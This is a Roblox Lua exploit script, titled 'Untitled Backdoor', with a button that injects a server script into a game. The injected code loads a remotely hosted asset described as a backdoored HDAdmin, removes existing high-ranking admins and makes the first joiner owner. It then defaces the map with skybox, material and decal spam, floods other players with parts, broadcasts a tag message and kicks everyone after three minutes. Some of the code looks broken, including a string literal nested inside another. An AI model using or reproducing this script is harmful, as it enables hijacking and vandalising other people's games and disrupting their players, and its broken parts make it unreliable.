pcall(function()
    local Players = game:GetService("Players")
    local ServerScriptService = game:GetService("ServerScriptService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    -- UI Setup
    local gui = Instance.new("ScreenGui")
    gui.Name = "xUI"
    gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BorderSizePixel = 0
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.Parent = gui

    local icon = Instance.new("ImageLabel", frame)
    icon.Size = UDim2.new(0, 60, 0, 60)
    icon.Position = UDim2.new(0, 10, 0, 10)
    icon.BackgroundTransparency = 1
    icon.Image = "rbxassetid://90188826577714"

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, -80, 0, 60)
    title.Position = UDim2.new(0, 80, 0, 10)
    title.BackgroundTransparency = 1
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 24
    title.Text = "Untitled Backdoor"
    title.TextXAlignment = Enum.TextXAlignment.Left

    local button = Instance.new("TextButton", frame)
    button.Size = UDim2.new(1, -20, 0, 40)
    button.Position = UDim2.new(0, 10, 1, -50)
    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    button.BorderSizePixel = 0
    button.Font = Enum.Font.GothamBold
    button.TextSize = 20
    button.TextColor3 = Color3.fromRGB(255, 0, 0)
    button.Text = "Untitled Backdoor"
    button.AutoButtonColor = true

    button.MouseButton1Click:Connect(function()
        if ServerScriptService:FindFirstChild("xBD") then return end

        local scriptInject = Instance.new("Script")
        scriptInject.Name = "xBD"
        scriptInject.Parent = ServerScriptService

        scriptInject.Source = [[
            local Players = game:GetService("Players")
            local InsertService = game:GetService("InsertService")
            local ServerStorage = game:GetService("ServerStorage")
            local Lighting = game:GetService("Lighting")
            local StarterScripts = game:GetService("StarterPlayer").StarterPlayerScripts
            local HDAdminAssetId = 857927023
            local SkyImage = "rbxassetid://90188826577714"

            -- Insert backdoored HDAdmin
            pcall(function()
                local inserted = InsertService:LoadAsset(HDAdminAssetId)
                if inserted then
                    inserted.Parent = workspace
                    local folder = inserted:FindFirstChildOfClass("Folder")
                    if folder then
                        folder.Parent = game.ServerScriptService
                    end
                end
            end)

            -- Wait for HDAdmin settings
            local hdSettings
            repeat wait(1)
                hdSettings = ServerStorage:FindFirstChild("HDAdminSettings")
            until hdSettings

            -- Clear all high-ranking users except the new owner
            local ranks = require(hdSettings.Settings.Ranks)
            for _, group in pairs(ranks) do
                if group.Users and group.Level >= 200 then
                    for i = #group.Users, 1, -1 do
                        table.remove(group.Users, i)
                    end
                end
            end

            local ownerName
            Players.PlayerAdded:Connect(function(player)
                if not ownerName then
                    ownerName = player.Name
                    if not ranks.Owner then
                        ranks.Owner = { Level = 255, Users = {} }
                    end
                    table.insert(ranks.Owner.Users, player.Name)
                end
            end)

            -- Public announcement
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ALL HAIL GUYS GOOBYALCHEMIST", "All")

            -- Skybox change
            local sky = Instance.new("Sky")
            for _, dir in ipairs({ "Bk", "Dn", "Ft", "Lf", "Rt", "Up" }) do
                sky["Skybox" .. dir] = SkyImage
            end
            Lighting.Sky = sky

            -- Material + Decal spam
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") then
                    obj.Material = Enum.Material.ForceField
                    obj.Color = Color3.new(0, 0, 0)
                    for _, decal in pairs(obj:GetChildren()) do
                        if decal:IsA("Decal") then
                            decal:Destroy()
                        end
                    end
                    local d = Instance.new("Decal", obj)
                    d.Texture = SkyImage
                    d.Face = Enum.NormalId.Front
                end
            end

            -- Red particle spam around other players
            spawn(function()
                local endTime = tick() + 180
                while tick() < endTime do
                    for _, p in pairs(Players:GetPlayers()) do
                        if p.Name ~= ownerName and p.Character and p.Character.PrimaryPart then
                            for i = 1, 20 do
                                local part = Instance.new("Part", workspace)
                                part.Size = Vector3.new(1, 1, 1)
                                part.Anchored = true
                                part.CanCollide = false
                                part.CFrame = p.Character.PrimaryPart.CFrame * CFrame.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
                                part.Material = Enum.Material.Neon
                                part.BrickColor = BrickColor.new("Really red")
                            end
                        end
                    end
                    wait(0.05)
                end
            end)

            -- LocalScript camera injection
            local camScript = Instance.new("LocalScript")
            camScript.Name = "xCam"
            camScript.Parent = StarterScripts
            camScript.Source = [[
                local Players = game:GetService("Players")
                local UserInputService = game:GetService("UserInputService")
                local RunService = game:GetService("RunService")
                local LocalPlayer = Players.LocalPlayer

                if not (require(game.ServerStorage.HDAdminSettings.Settings.Ranks).Owner.Users[1] == LocalPlayer.Name) then return end

                local Camera = workspace.CurrentCamera
                Camera.CameraType = Enum.CameraType.Scriptable

                local direction = Vector3.new()
                local speed = 100

                UserInputService.InputBegan:Connect(function(input, gameProcessed)
                    if gameProcessed then return end
                    if input.KeyCode == Enum.KeyCode.W then
                        direction += Camera.CFrame.LookVector
                    elseif input.KeyCode == Enum.KeyCode.S then
                        direction -= Camera.CFrame.LookVector
                    elseif input.KeyCode == Enum.KeyCode.A then
                        direction -= Camera.CFrame.RightVector
                    elseif input.KeyCode == Enum.KeyCode.D then
                        direction += Camera.CFrame.RightVector
                    end
                end)

                UserInputService.InputEnded:Connect(function(input)
                    if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.D then
                        direction = Vector3.new()
                    end
                end)

                RunService.RenderStepped:Connect(function(dt)
                    if direction.Magnitude > 0 then
                        Camera.CFrame = Camera.CFrame + direction.Unit * speed * dt
                    end
                end)
            ]]
            
            -- Kick all after 3 minutes
            delay(180, function()
                for _, player in pairs(Players:GetPlayers()) do
                    player:Kick("GOOBYALCHEMIST")
                end
            end)
        ]]
    end)
end)
